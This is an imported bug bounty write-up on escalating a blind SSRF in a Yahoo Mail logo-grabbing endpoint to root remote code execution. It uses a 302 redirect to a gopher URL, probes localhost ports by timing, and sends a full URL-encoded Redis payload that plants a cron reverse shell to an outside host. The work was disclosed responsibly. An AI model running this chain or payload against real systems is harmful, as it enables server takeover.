---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-05-17_just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k.md
original_filename: 2021-05-17_just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k.md
title: 'Just Gopher It: Escalating a Blind SSRF to RCE for $15k'
category: documents
detected_topics:
- command-injection
- idor
- ssrf
- rate-limit
- api-security
tags:
- imported
- documents
- command-injection
- idor
- ssrf
- rate-limit
- api-security
language: en
raw_sha256: ac85699b2bc8d6234b280d9c812f541c80933a6f16fdd16d9fa0113474a86cfa
text_sha256: 8391c608ff11bca1aa549287e83f33b69fe6f61b9dda9a6d7e50f1ea33814482
ingested_at: '2026-06-28T07:32:06Z'
sensitivity: unknown
redactions_applied: false
---

# Just Gopher It: Escalating a Blind SSRF to RCE for $15k

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-05-17_just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k.md
- Source Type: markdown
- Detected Topics: command-injection, idor, ssrf, rate-limit, api-security
- Ingested At: 2026-06-28T07:32:06Z
- Redactions Applied: False
- Raw SHA256: `ac85699b2bc8d6234b280d9c812f541c80933a6f16fdd16d9fa0113474a86cfa`
- Text SHA256: `8391c608ff11bca1aa549287e83f33b69fe6f61b9dda9a6d7e50f1ea33814482`


## Content

---
title: "Just Gopher It: Escalating a Blind SSRF to RCE for $15k"
url: "https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530"
authors: ["SirLeeroyJenkins (@SirLeeroyJenkin)"]
bugs: ["SSRF", "RCE"]
bounty: "15,000"
publication_date: "2021-05-17"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3646
scraped_via: "browseros"
---

# Just Gopher It: Escalating a Blind SSRF to RCE for $15k

Top highlight

Just Gopher It: Escalating a Blind SSRF to RCE for $15k — Yahoo Mail
SirLeeroyJenkins
Follow
7 min read
·
May 17, 2021

2.2K

15

Part 1: Recon

Typically for a wide scope bug bounty program I’ll start with subdomain enumeration to increase my attack surface, but in this case I was going after a single web application on my target (Yahoo Mail).

Since I was only focusing on a single web app, I started by using the tool GAU to fetch a list of urls and endpoints. I also looked through various javascript files for hidden endpoints, and did some directory fuzzing with the tool Ffuf. I found a few interesting endpoints via these methods, but nothing that seemed vulnerable.

Since the first method of recon didn’t lead to any findings, I tried another method — testing the various functions of the web application while running Burp proxy in the background. All of the requests made are stored in an organized list in Burp, which makes it easy to look through them all for anything interesting or potentially vulnerable.

After testing the functions of the web app, I began to look through the requests stored in the proxy log and came across a request similar to this:

GET /xxx/logoGrabber?url=http://example.com
Host: mail.yahoo.com
...

A GET request that takes a urlparameter. The response to this request looked like this and contains information about the url’s title and logo:

{"responseTime":"99999ms","grabbedUrl":"http://example.com","urlInfo":{"pageTitle":"Example Title","pageLogo":"pagelogourl"}}

This request immediately grabbed my interest because it was returning some data about a URL. Any time you come across a request that returns information from a URL , it’s a good idea to test for SSRF.

Part 2: Discovering SSRF

My first attempts at SSRF failed. I was able to get external interaction to my server but not hit any internal IP addresses due to the protections they had in place.

After failing to hit any internal IP addresses, I decided to see if I could hit any of Yahoo’s publicly known corporate subdomains. I did some subdomain enumeration then starting spraying all the enumerated domains at the request.

Eventually I got lucky and found some requests that returned title data from sites that weren’t publicly accessible.

A good example of this is subdomain somecorpsite.yahoo.com . When I tried to access http://somecorpsite.yahoo.com in my browser, the request just timed out. BUT when I submitted the request:

GET /xxx/logoGrabber?url=http://somecorpsite.yahoo.com
Host: mail.yahoo.com
...

The response contained the internal title and logo info:

{"responseTime":"9ms","grabbedUrl":"http://somecorpsite.yahoo.com","urlInfo":{"pageTitle":"INTERNAL PAGE TITLE","pageLogo":"http://somecorpsite.yahoo.com/logos/logo.png"}}

Now that I was able to hit internal subdomains to access titles and logo urls I decided to submit a report t for blind SSRF. The internal title information did not contain anything too sensitive, and no other page contents were returned so I figured this would be considered a fairly low-impact blind SSRF, but I ran out of ideas to escalate this and decided to report it as-is.

After some time the report was accepted and triaged.

Part 3: The RCE

About a month had gone by since my original report was triaged. I was excited that it was triaged, but knew the impact was low and I likely wouldn’t get much out of it.

The SSRF was still vulnerable and wasn’t fixed yet, so I decided to do some more research to try and escalate it further. During my research I learned that the Gopher protocol is an excellent way to escalate SSRFs, and in some cases can result in full remote code execution.

In order to test if the gopher protocol was supported I submitted a request similar to the following:

GET /xxx/logoGrabber?url=gopher://myburpcollaboratorurl
Host: mail.yahoo.com
...

Unfortunately the request immediately failed and resulted in a server error. No request was made to my Burp collaborator so it seemed as though the gopher protocol was not supported.

While continuing my testing, I read online that redirects can often be a great way to bypass certain SSRF protections, so I decided to test whether the server follows redirects.

To test if redirects worked,I set up a Python http server that 302 redirected all GET traffic to my Burp collaborator url —

python3 302redirect.py port “http://mycollaboratorurl/”

Then I submitted a request like the following in order to see if the redirect hit my collaborator:

GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: mail.yahoo.com
...

After submitting the request I noticed that the redirect was followed, resulting in a hit to my Burp Collaborator url. So now I had verified that 302 redirects were followed…

Now that I had redirects working, I decided to test it with the gopher protocol. Originally submitting the gopher payload in the request directly resulted in a server error, so I set up my redirect server like the following to test if gopher would work via a redirect:

python3 302redirect.py port “gopher://mycollaboratorurl/”

Then again, submitted the request to my server —

GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: mail.yahoo.com
...

To my surprise, it was successful — the redirect was followed and the I got a request to my collaborator url! There was some sort of filter against Gopher protocol urls, but if I redirect from my own server it bypasses this; The redirect is followed and the Gopher payload executes!

Get SirLeeroyJenkins’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Not only did gopher payloads execute via 302 redirect, but I realized that with gopher I could also now hit internal IP addresses like 127.0.0.1 that were previously filtered.

Now that I had Gopher payloads working and could hit internal hosts, I had to figure out what services I could interact with in order to escalate. After doing some searching, I came across the tool Gopherus which generates gopher payloads for escalating SSRF. It contains payloads for the following services:

MySQL (Port-3306)
FastCGI (Port-9000)
Memcached (Port-11211)
Redis (Port-6379)
Zabbix (Port-10050)
SMTP (Port-25)

To determine if any of the above ports were open on 127.0.0.1, I used the SSRF and response times to port scan.

By 302 redirecting my web server to gopher://127.0.0.1:port , then submitting the request

GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: mail.yahoo.com
...

I could identify open ports because the request’s response time would be long if a port was closed and short if a port was open. Using this port scanning method I checked all 6 of the above ports. One port seemed to be open — port 6379 (Redis)

302redirect → gopher://127.0.0.1:3306 [Response time: 3000ms]-CLOSED
302redirect → gopher://127.0.0.1:9000 [Response time: 2500ms]-CLOSED
302redirect → gopher://127.0.0.1:6379 [Response time: 500ms]-OPEN
etc…

Now things started looking really good. It seemed like I had everything I need:

Gopher protocol accepted by 302 redirect
Able to hit localhost with gopher payloads
Identified a potentially vulnerable service running on localhost

Using Gopherus , I generated a Redis reverse shell payload which ended up looking like this:

gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A

If this payload was successful it would result in a reverse shell to my netcat listener. I started my server to 302 redirect to the gopher payload like so:

python3 302redirect.py port "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2469%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/x.x.x.x/1337%200%3E%261%22%0A
%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2414%0D%0A/var/lib/redis%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A"

Once my web server was started, I also started a Netcat listener on port 1337 to catch any incoming reverse shell.

And then, finally the moment of truth. I submitted the request:

GET /xxx/logoGrabber?url=http://my302redirectserver/
Host: mail.yahoo.com
...

And…nothing. Nothing happened. I saw a request come to my redirect server, but no reverse shell coming back to my netcat. That was the end of it I thought, no RCE for me.

I figured maybe my port scan was false positive and that there was no Redis server running on the localhost.

I accepted defeat and starting closing everything down. I literally had my mouse on the X button on my terminal running netcat, milliseconds away from clicking to close it, when suddenly —

I really have no idea why it was so delayed but about 5 minutes after submitting the request, I received a reverse shell. I’m so glad I kept the listener on , otherwise I would’ve never known I got an RCE.

Press enter or click to view image in full size

I ran whoami to verify I had RCE(and I was root!), then immediately disconnected and updated my original report with the new info.

This vulnerability was discovered/reported in May of 2020 and is currently closed as resolved.

I ended up getting a $15,000 bounty payment for this finding, as well as some nice compliments from The Paranoids!
